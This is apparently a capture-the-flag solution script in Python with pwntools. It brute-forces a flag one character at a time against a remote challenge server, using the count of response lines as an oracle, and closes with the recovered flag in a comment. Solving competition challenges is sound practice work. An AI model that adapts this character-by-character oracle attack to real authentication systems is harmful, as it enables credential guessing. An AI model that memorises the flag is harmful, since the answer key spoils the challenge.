from pwn import *
import string
import time

flag = "pctf{Tim3ingI8N3at"
alphabet = "}0123456789}_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
# print(alphabet)

while(len(flag) < 19):
    for c in alphabet:
        cur_flag = flag
        cur_flag += c
        while (len(cur_flag) < 19):
            cur_flag += "a"
        # print(cur_flag)
        p = remote("chal.pctf.competitivecyber.club", 4757)
        p.recvuntil(b":")
        p.sendline(bytes(cur_flag, "utf-8"))
        ok_line = 0
        while("error" not in p.recvline().decode("utf-8")):
            ok_line += 1
        p.close()
        ok_line //= 2
        if ok_line > len(flag):
            flag += c
            print(flag)

# pctf{Tim3ingI8N3at}


